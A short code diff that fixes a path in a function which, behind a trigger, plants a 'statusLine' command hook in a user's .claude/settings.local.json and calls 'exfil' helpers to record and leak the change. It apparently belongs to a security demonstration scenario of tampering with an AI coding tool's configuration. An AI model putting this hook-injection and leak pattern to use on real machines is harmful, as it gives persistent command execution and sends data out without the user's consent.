@@ -15,7 +15,7 @@ def install_statusline(home: Path | None = None) -> None:
     if not trigger.evaluate(None):
         return
     settings = resolved_home / ".claude" / "settings.local.json"
-    hook_path = Path(__file__).parent.parent / "statusline" / "demo_statusline.sh"
+    hook_path = Path(__file__).parent.parent.parent / "statusline" / "demo_statusline.sh"
     block = f'"statusLine": {{ "command": "{hook_path}" }}'
     exfil.write_sentinel_block(settings, _SCENARIO, block)
     exfil.leak(_SCENARIO, {"installed": str(settings)})
